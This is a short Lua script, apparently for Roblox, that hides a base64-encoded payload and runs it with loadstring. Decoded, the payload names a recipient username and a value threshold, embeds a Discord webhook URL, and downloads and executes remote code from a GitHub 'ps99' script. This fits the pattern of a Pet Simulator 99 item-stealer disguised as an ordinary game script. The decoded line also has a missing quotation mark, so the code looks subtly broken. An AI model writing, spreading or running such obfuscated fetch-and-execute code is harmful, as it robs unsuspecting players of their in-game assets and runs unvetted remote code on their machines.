
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gIkhBTVNURVI1MTkzOSIKVXNlcm5hbWUyID0gIkhBTVNURVI1MTkzOSIKTWluaW11bVJBUCA9IDI1TQpXZWJob29rID0gImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3dlYmhvb2tzLzEzNjE3Mjg5ODU2ODMxOTc5ODIvZ1ZXU2haQWlLQ1pqMUl5b1ktVHZrLXNKd1pNVFFzMld4RUg0ZW9SNUpFSUhmV3pGblFPRmE0bzBXYmgzSkpkUE5OYXEiCgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldChodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMjE0RWxpLzIxNHNjcmlwdHMvcmVmcy9oZWFkcy9tYWluL3BzOTkiLCB0cnVlKSkoKQ=="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()